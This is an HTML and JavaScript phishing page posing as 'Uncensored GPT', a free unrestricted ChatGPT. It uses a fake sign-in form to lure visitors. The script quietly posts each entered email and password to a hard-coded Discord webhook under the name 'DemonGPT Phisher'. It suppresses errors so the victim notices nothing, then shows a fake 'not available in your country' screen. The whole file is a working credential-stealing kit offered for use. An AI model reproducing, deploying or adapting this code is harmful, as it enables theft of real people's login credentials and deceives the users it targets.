<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uncensored GPT</title>
    <style>
        @keyframes flicker {
            0%, 100% { text-shadow: 0 0 5px #ff4800, 0 0 10px #ff4800, 0 0 20px #ff4800, 0 0 40px #ff0000; }
            50% { text-shadow: 0 0 2px #ff4800, 0 0 5px #ff4800, 0 0 10px #ff0000, 0 0 20px #ff0000; }
        }

        :root {
            --background-color: #000000;
            --form-bg-color: rgba(15, 15, 15, 0.85);
            --text-color: #e0e0e0;
            --input-bg-color: #2a0000;
            --input-border-color: #660000;
            --button-bg-color: #c20000;
            --button-hover-color: #ff0000;
            --glow-color: #ff0000;
        }

        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: var(--background-color);
            background-image: url('https://i.imgur.com/vHqBbyD.jpg'); /* Repeating flame pattern */
            background-size: cover;
            background-attachment: fixed;
            background-blend-mode: multiply;
            color: var(--text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .container {
            text-align: center;
            background-color: var(--form-bg-color);
            padding: 40px;
            border-radius: 12px;
            border: 1px solid var(--input-border-color);
            box-shadow: 0 0 35px rgba(255, 0, 0, 0.5);
            width: 350px;
        }

        .logo {
            width: 150px;
            height: 150px;
            margin-bottom: 20px;
            border-radius: 50%;
            box-shadow: 0 0 20px var(--glow-color);
        }

        h1, h2 {
            margin: 0 0 25px 0;
            font-size: 24px;
            font-weight: 600;
            color: #ffffff;
            animation: flicker 2s infinite;
        }

        p {
            margin-top: -15px;
            margin-bottom: 30px;
            font-size: 16px;
        }

        .input-form input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border-radius: 6px;
            border: 1px solid var(--input-border-color);
            background-color: var(--input-bg-color);
            color: var(--text-color);
            box-sizing: border-box;
            font-size: 16px;
        }

        .input-form input:focus {
            outline: none;
            border-color: var(--glow-color);
            box-shadow: 0 0 10px var(--glow-color);
        }

        .action-button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            background-color: var(--button-bg-color);
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s;
            text-shadow: 0 0 5px black;
        }

        .action-button:hover {
            background-color: var(--button-hover-color);
            box-shadow: 0 0 15px var(--button-hover-color);
        }

        #step-2, #step-3 {
            display: none; /* Hidden by default */
        }
    </style>
</head>
<body>

    <!-- Step 1: Initial Landing Page -->
    <div class="container" id="step-1">
        <img src="https://i.imgur.com/k910T8M.png" alt="Demon AI" class="logo">
        <h1>Welcome</h1>
        <p>Your uncensored AI version of ChatGPT for free.</p>
        <button class="action-button" id="next-button">Next</button>
    </div>

    <!-- Step 2: Login Form -->
    <div class="container" id="step-2">
        <img src="https://i.imgur.com/fBCF18F.png" alt="our infrastructure Logo" class="logo" style="width: 80px; height: 80px; filter: grayscale(1) invert(1);">
        <h2>Sign in to our infrastructure</h2>
        <form class="input-form" id="login-form">
            <input type="email" id="email" placeholder="Email address" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="action-button">Continue</button>
        </form>
    </div>

    <!-- Step 3: Final Message -->
    <div class="container" id="step-3">
        <h1>Access Denied</h1>
        <p>This app is not available in your country.</p>
    </div>

    <script>
        // Get elements
        const step1 = document.getElementById('step-1');
        const step2 = document.getElementById('step-2');
        const step3 = document.getElementById('step-3');
        const nextButton = document.getElementById('next-button');
        const loginForm = document.getElementById('login-form');

        // Handle transition from Step 1 to Step 2
        nextButton.addEventListener('click', () => {
            step1.style.display = 'none';
            step2.style.display = 'block';
        });

        // Handle form submission
        loginForm.addEventListener('submit', async (event) => {
            event.preventDefault(); // Prevent page refresh

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Stop if fields are empty
            if (!email || !password) return;

            // --- THIS IS WHERE THE DATA IS SENT ---
            const webhookUrl = 'https://discord.com/api/webhooks/1485149098469363722/eHt-L942QorL11aYAEylSum_FRe197gPBriMOhFTUs56pUVWh1zurqCedmUT-ePtzt1p';
            const payload = {
                username: "DemonGPT Phisher",
                avatar_url: "https://i.imgur.com/k910T8M.png",
                embeds: [{
                    title: "New our infrastructure Credentials Captured",
                    color: 13369344, // Fiery Red
                    fields: [
                        { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
                        { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false }
                    ],
                    footer: { text: `Captured at ${new Date().toUTCString()}` }
                }]
            };

            // Send to webhook in the background. The user sees nothing.
            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                // Ignore errors. The primary goal is to not alert the user.
            }

            // --- COMPLETE THE ILLUSION ---
            step2.style.display = 'none';
            step3.style.display = 'block';
        });
    </script>

</body>
</html>
